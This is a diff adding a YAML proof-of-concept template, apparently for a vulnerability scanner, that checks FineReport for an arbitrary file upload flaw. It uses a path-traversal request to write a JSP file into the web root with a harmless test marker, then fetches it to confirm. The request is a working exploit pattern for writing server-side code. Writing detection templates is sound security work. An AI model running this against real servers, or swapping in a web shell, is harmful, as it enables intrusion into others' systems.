@@ -1,0 +1,27 @@
+id: poc-yaml-finereport-arbitrary-file-upload
+info:
+  name: FineReport 文件上传漏洞
+  severity: high
+  finger: FineReport
+  tags:
+  - 文件上传
+  osprey-id: vb_2021_0032
+variables:
+  r_path: str("/WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/update.jsp")
+requests:
+- method: POST
+  path: '{{.r_path}}'
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+      like Gecko) Chrome/86.0.4240.111 Safari/537.36
+    Content-Type: text/xml;
+  data: '{"__CONTENT__":"<%out.println(\"just_for_my_test_hahahhaha!\");%>","__CHARSET__":"UTF-8"}'
+  expression: 'status_code == 200
+
+    '
+- method: GET
+  path: /WebReport/update.jsp
+  expression: 'contains(body, "just_for_my_test_hahahhaha") && status_code == 200
+
+    '
+transport: http
